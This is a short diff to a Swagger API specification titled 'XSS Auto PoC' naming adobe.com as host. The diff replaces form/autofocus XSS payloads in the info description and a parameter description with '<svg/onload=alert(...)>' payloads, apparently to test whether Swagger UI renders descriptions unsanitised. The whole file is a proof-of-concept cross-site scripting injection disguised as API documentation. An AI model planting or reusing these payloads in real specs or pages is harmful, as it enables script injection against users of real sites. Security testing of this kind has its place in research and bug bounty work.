@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: XSS Auto PoC
   description: |
-    <form><input autofocus onfocus=alert('XSS Adobe Autofocus')></form>
+    <svg/onload=alert('XSS via SVG Adobe')>
   version: "1.0"
 host: adobe.com
 basePath: /
@@ -20,7 +20,7 @@ paths:
           required: false
           type: string
           description: |
-            <form><input autofocus onfocus=alert('XSS From Param')></form>
+            <svg/onload=alert('XSS via SVG Adobe')>
       responses:
         '200':
           description: OK
